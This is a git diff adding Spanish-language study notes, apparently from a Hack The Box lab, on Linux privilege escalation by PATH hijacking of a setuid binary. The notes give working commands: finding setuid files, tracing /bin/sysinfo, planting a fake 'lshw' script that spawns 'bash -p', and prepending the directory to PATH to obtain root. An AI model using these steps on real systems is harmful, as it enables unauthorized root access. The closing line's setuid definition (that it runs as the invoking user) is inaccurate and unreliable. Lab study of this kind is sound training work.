@@ -26,6 +26,17 @@ htb_student@NIX02:~$ chmod +x ls
 htb_student@NIX02:~$ ls
 PATH ABUSE!!
 ```
+#### Ejemplo de path abuse con setuid permissions
+- Usamos: `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
+- Nos aparece este binario `/bin/sysinfo` desconocido.
+- Usamos `strings /bin/sysinfo` y vemos que utiliza el comando `lshw` para mostrar información del sistema.
+- Entonces utilizamos strace para ver como se comporta el binario: `strace -f /bin/sysinfo 2>&1 | grep execve`
+- Y vemos que llama a este programa sin un path definido.
+- Entonces podemos redefinir el path de este binario hacia un binario malicioso para elevar privilegios
+- `echo -e '#!/bin/bash\n/bin/bash -p' > lshw`
+- `chmod +x lshw`
+- `export PATH=`pwd`:$PATH`
+- `/bin/sysinfo` **Y a partir de acá ya tenemos acceso root**
 
 ### Setuid permissions
 - Definición: Setuid permissions permite a un proceso ejecutar comandos como el usuario que lo ejecuta. **Set User ID upon Execution (setuid)**
